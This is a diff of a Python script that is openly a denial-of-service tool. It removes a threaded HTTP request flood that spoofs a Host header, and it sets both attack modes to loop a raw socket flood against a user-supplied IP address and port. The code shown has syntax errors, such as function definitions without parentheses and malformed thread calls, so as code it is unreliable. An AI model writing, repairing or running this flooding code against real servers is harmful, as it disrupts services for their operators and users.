@@ -51,32 +51,10 @@ if args.http:
     print("Set attack to http")
     Attack = 1
 else:
-    Attack = 2
+    Attack = 1
 
 #attack code
 while Attack == 1:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((args.ipv4, (int)(args.port)))
-    print('sending ' "GET /" + args.ipv4 + " HTTP/1.1\r\n")\
-    def send_req:
-        s.sendto(("GET /" + args.ipv4 + " HTTP/1.1\r\n").encode('ascii'), (args.ipv4, (int)(args.port)))
-     
-    def mask_send:
-        s.sendto(("Host: " +  mask + "\r\n\r\n").encode('ascii'), (args.ipv4, (int)(args.port)))
-    if __name__ == "__main__":
-        t1 = threading.Thread(target=send_req, 10000)
-        t2 = threading.Thread(target=mask_send, 10000)
-        
-        t1.start()
-        t2.start()
-        print('sending ' "Host: " + mask + "\r\n\r\n")
-        t1.join()
-        t2.join()
-        print('attac complete')
-    
-    s.close()
-
-while Attack == 2:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((args.ipv4, (int)(args.port)))
     print('sending 1024 bytes to ' + args.ipv4)
